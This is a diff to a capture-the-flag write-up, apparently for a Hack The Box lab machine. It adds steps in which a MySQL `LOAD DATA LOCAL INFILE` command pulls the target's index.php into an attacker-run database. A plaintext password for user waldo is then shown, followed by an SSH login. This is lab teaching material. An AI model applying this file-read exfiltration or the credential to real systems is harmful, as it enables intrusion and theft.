@@ -127,7 +127,22 @@ Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
 ---
 
 ## Exploit
-- Login using the created database and credentials.
+  - Login using the created database and credentials.
 ![image](https://user-images.githubusercontent.com/83878909/229499456-19111d24-a091-4402-be57-f7566ffca780.png)
 ![image](https://user-images.githubusercontent.com/83878909/229498960-f29142fc-f648-45c1-83ae-cece1cf58fd6.png)
+
+### Exfiltrate Data
+  - SQL Command: `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE PwnMe.pwned FIELDS TERMINATED BY "\n"`
+![image](https://user-images.githubusercontent.com/83878909/229501451-a5e334eb-59c5-4484-aa72-266bce45efce.png)
+  - Read from Local Database: `SELECT * FROM pwned;` ##Table Name
+  - Credentials Found: `waldo:&<h5b~yK3F#{PaPB&dA}{H>`
+![image](https://user-images.githubusercontent.com/83878909/229502059-1cc7ece1-2c10-4c1a-bb33-23a69e796c10.png)
+
+## SSH Login
+  - SSH: `ssh waldo@10.10.10.187`
+![image](https://user-images.githubusercontent.com/83878909/229502832-cd439abd-e8bd-4a93-8613-2c2696b97cc8.png)
+
+---
+
+## Privilege Escalation
 
